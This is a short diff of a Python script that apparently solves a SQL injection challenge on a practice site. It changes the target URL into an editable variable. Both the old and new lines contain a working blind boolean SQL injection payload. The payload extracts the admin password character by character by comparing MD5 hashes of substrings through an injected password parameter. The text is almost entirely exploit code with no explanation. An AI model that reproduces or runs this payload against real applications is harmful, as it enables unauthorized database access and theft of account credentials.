@@ -11,7 +11,7 @@ def def_handler(sig, frame):
 # Ctrl+C
 signal.signal(signal.SIGINT, def_handler)
 
-login_url = "https://warzone.wsg127.com"
+login_url = "https://warzone.wsg127.com"    ## Change this
 characters = string.ascii_letters+ string.digits + "{}"
 
 def makeSQLI():
@@ -28,7 +28,7 @@ def makeSQLI():
     for position in range(1, 50):
         for character in characters:
             
-            payload = "https://warzone.wsg127.com/sqlichallenges/sql3?username=\&password=+or+if((select+md5(substring(password, 1," + str(position) + "))+from+users+where+username=\"admin\")=md5(\"" +data+ character + "\"),1,0)%23"
+            payload = login_url+"/sqlichallenges/sql3?username=\&password=+or+if((select+md5(substring(password, 1," + str(position) + "))+from+users+where+username=\"admin\")=md5(\"" +data+ character + "\"),1,0)%23"
         
             
             p1.status(data)
